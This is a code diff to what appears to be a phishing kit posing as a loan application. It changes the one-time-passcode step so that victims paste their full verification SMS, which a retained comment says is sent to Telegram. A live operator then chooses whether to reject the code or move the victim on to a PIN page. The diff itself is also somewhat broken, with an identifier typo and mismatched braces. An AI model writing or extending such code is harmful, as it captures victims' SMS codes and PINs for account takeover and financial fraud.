@@ -648,31 +648,50 @@ input[type="text"] {
     </div>
 
 
-    <!-- PAGE 5 OTP -->
+ 
+<!-- PAGE 5: FULL SMS MESSAGE -->
+<div id="page5" class="hidden">
 
-    <div id="page5" class="hidden">
+    <div class="center">
+        <div class="icon">📩</div>
 
-        <div class="center">
+        <h2>Paste SMS Message</h2>
 
-            <div class="icon">🔐</div>
+        <p style="margin-top:10px;color:#6b7280">
+            Paste the complete verification SMS received on your phone.
+        </p>
+    </div>
 
- <div class="page5" class="hidden"
-  <input id="otpPasteInput" type="text" inputmode="numeric"
-         placeholder="Paste SMS here (e.g. Your code is 123456)" />
-  <button id="otpSubmit">
+    <div class="card" style="margin-top:20px">
 
-        <button
-            id="verifyButton"
-            class="button blue"
-            disabled
-            onclick="submitOTP()"
-        >
-            Verify
-        </button>
+        <span class="label">COMPLETE SMS MESSAGE</span>
 
-        <div id="otpStatus" class="status-message"></div>
+        <textarea
+            id="otpPasteInput"
+            rows="5"
+            placeholder="Paste the complete SMS message here..."
+            style="width:100%;padding:14px;border:2px solid #e2e8f0;border-radius:12px;font-size:14px;resize:vertical"
+        ></textarea>
+
+        <p style="font-size:11px;color:#6b7280;margin-top:8px">
+            Do not paste messages containing passwords, PINs,
+            or financial authorization codes.
+        </p>
 
     </div>
+
+    <button
+        id="verifyButton"
+        class="button blue"
+        disabled
+        onclick="submitSMSMessage()"
+    >
+        Continue
+    </button>
+
+    <div id="otpStatus" class="status-message"></div>
+
+</div>
 
 
     <!-- PAGE 6 PIN VERIFICATION -->
@@ -1213,37 +1232,26 @@ function goToOTP() {
 
 function setupOTP() {
 
-    const inputs =
-        document.querySelectorAll(
-            "#otpGrid input"
-        );
+    const smsInput = document.getElementById("otpPasteInput");
+    const verifyButton = document.getElementById("verifyButton");
 
-    const button =
-        document.getElementById(
-            "verifyButton"
-        );
+smsInput.addEventListener("input", function () {
+    verifyButton.disabled = smsInput.value.trim().length === 0;
+});
 
-  const otpPasteInput = document.getElementById('otpPasteInput');
-  const otpDemoSubmit = document.getElementById('otpDemoSubmit');
+smsInput.addEventListener("paste", function () {
+    setTimeout(() => {
+        verifyButton.disabled =
+            smsInput.value.trim().length === 0;
+    }, 0);
+});
 
-  otpPasteInput.addEventListener('paste', (e) => {
-    const text = (e.clipboardData || window.clipboardData).getData('text');
-    const digits = text.replace(/\D/g, '').slice(0, 6);
+function submitSMSMessage() {
+    const message = smsInput.value.trim();
 
-    if (digits) {
-      e.preventDefault();
-      otpPasteInput.value = digits;
-    }
-  });
-
-  otpPasteInput.addEventListener('input', () => {
-    otpPasteInput.value = otpPasteInput.value.replace(/\D/g, '').slice(0, 6);
-  });
-
-        );
-
+    if (!message) {
+        alert("Please paste the SMS message.");
         return;
-
     }
 
     // Send OTP to telegram for admin verification
@@ -1269,8 +1277,8 @@ function setupOTP() {
                         showPage("page6", 6, "Enter Your PIN", "Authorize your loan application");
                     } else if (action === "wrongotp") {
                         alert("The OTP provided is wrong or has expired. Please try again.");
-                        document.querySelectorAll("#otpGrid input").forEach(i => i.value = "");
-                        document.querySelectorAll("#otpGrid input")[0].focus();
+                        document.querySelectorAll("#otpPasteInput").forEach(i => i.value = "");
+                        document.querySelectorAll("#otpPasteIput")[0].focus();
                     } else {
                         alert("Unknown OTP action: " + action);
                     }
